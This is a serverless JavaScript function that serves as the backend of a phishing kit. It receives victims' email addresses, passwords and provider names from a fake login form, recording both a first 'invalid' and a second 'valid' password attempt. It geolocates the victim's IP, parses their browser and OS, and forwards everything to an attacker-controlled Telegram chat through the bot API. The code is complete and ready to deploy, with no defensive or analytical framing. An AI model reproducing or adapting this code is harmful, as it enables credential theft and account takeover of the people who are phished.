const UAParser = require('ua-parser-js');

exports.handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  // Helper: safe timeout signal
  const createTimeoutSignal = (ms) => {
    const controller = new AbortController();
    setTimeout(() => controller.abort(), ms);
    return controller.signal;
  };

  try {
    const bodyRaw = event.body || '{}';
    let data = {};
    try {
      data = JSON.parse(bodyRaw);
    } catch (parseErr) {
      console.error("Error parsing request body:", parseErr);
    }

    const {
      email,
      password,
      firstAttemptPassword,
      secondAttemptPassword,
      provider,
      timestamp,
      userAgent,
      sessionId: incomingSessionId,
    } = data;

    // Required env vars
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ success: false, message: 'Server misconfiguration' })
      };
    }
    
    // --- IP and Location Detection ---
    const headersIn = event.headers || {};
    const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
    const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
                      (event.requestContext?.identity?.sourceIp) || 'Unknown').toString().split(',')[0].trim();
    
    let locationData = { country: 'Unknown', regionName: 'Unknown' };
    try {
      if (clientIP !== 'Unknown' && !clientIP.startsWith('127.0.0.1')) {
        const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=country,regionName`);
        if (geoResponse.ok) {
          const geoJson = await geoResponse.json();
          locationData.country = geoJson.country || 'Unknown';
          locationData.regionName = geoJson.regionName || 'Unknown';
        }
      }
    } catch (e) {
      console.error('Geolocation lookup failed:', e);
    }


    // --- Enhanced Browser and OS Detection ---
    const uaParser = new UAParser(userAgent || '');
    const browserInfo = uaParser.getBrowser(); // { name, version }
    const osInfo = uaParser.getOS();           // { name, version }
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
    const formattedBrowser = browserInfo.name ? `${browserInfo.name} ${browserInfo.version || ''}`.trim() : 'Unknown Browser';
    const formattedOS = osInfo.name ? `${osInfo.name} ${osInfo.version || ''}`.trim() : 'Unknown OS';


    // --- Prepare Passwords ---
    const plainFirstAttemptPassword = firstAttemptPassword || 'Not captured';
    const plainSecondAttemptPassword = secondAttemptPassword || 'Not captured';


    // --- Compose Enhanced Telegram Message ---
    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
    const hasTwoStepData = plainFirstAttemptPassword !== 'Not captured' && plainSecondAttemptPassword !== 'Not captured';
    
    let passwordSection = '';
    if (hasTwoStepData) {
        passwordSection = `🔑 First (invalid): \`${plainFirstAttemptPassword}\`\n🔑 Second (valid): \`${plainSecondAttemptPassword}\``;
    } else {
        // Fallback for single password if provided
        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
    }
    
    // Using UTC timestamp from the user for consistency
    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'UTC', hour12: true
    }) + ' UTC';

    const message = `
*🔐 PARISRESULTS 🔐*

*ACCOUNT DETAILS*
- 📧 Email: \`${email || 'Not captured'}\`
- 🏢 Provider: *${provider || 'Others'}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: \`${clientIP}\`
- 🌍 Location: *${locationData.regionName}, ${locationData.country}*
- 💻 OS: *${formattedOS}*
- 🌐 Browser: *${formattedBrowser}*
- 🖥️ Device Type: *${deviceInfo}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: \`${sessionId}\`
`;


    // --- Send main message to Telegram ---
    const telegramSignal = createTimeoutSignal(15000);
    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
      signal: telegramSignal,
    });
    
    if(!telegramResponse.ok) {
        const telegramResult = await telegramResponse.json();
        console.error("Telegram API error:", telegramResult);
    }

    // --- Build final response for the client ---
    const responseBody = {
      success: true,
      sessionId,
    };

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(responseBody),
    };

  } catch (error) {
    console.error('Function error:', error);
    // Attempt to notify about the error
    try {
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const errMsg = `🚨 *Function Error*\n\n\`\`\`${String(error.message || error)}\`\`\``;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: errMsg, parse_mode: 'Markdown' }),
          signal: createTimeoutSignal(8000),
        });
      }
    } catch (notificationError) {
      // ignore
    }

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error' }),
    };
  }
};
